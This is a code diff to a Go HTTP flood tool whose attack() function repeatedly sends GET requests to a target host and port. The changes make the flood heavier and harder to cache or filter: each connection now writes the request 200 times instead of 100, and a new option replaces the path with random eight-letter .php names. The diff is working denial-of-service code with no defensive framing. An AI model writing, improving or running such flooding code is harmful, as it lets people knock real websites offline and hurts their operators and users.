@@ -17,6 +17,8 @@ var (
 	threads   = 0
 	path      = "/"
 	timer     = 0
+	rpath     = false
+	a_z       = []string{"a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z"}
 	acceptall = []string{
 		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
 		"Accept-Encoding: gzip, deflate\r\n",
@@ -99,6 +101,9 @@ func attack() {
 	var err error
 	header := getheader()
 	for {
+		if rpath == true {
+			path = "/" + a_z[rand.Intn(len(a_z))] + a_z[rand.Intn(len(a_z))] + a_z[rand.Intn(len(a_z))] + a_z[rand.Intn(len(a_z))] + a_z[rand.Intn(len(a_z))] + a_z[rand.Intn(len(a_z))] + a_z[rand.Intn(len(a_z))] + a_z[rand.Intn(len(a_z))] + ".php"
+		}
 		get_host := "GET " + path + " HTTP/1.1\r\nHost: " + ip + ":" + strconv.Itoa(port) + "\r\n"
 		request := get_host + header
 		addr := ip + ":" + strconv.Itoa(port)
@@ -114,7 +119,7 @@ func attack() {
 		if err != nil {
 			fmt.Println("Connection Down!!!")
 		} else {
-			for i := 0; i < 100; i++ {
+			for i := 0; i < 200; i++ {
 				s.Write([]byte(request))
 			}
 			s.Close()
@@ -131,6 +136,12 @@ func main() {
 	}
 	port = cport
 	path = os.Args[3]
+	if path == "t" {
+		rpath = true
+	}
+	if path == "T" {
+		rpath = true
+	}
 	s_threads := os.Args[4]
 	cthreads, err := strconv.Atoi(s_threads)
 	if err != nil {
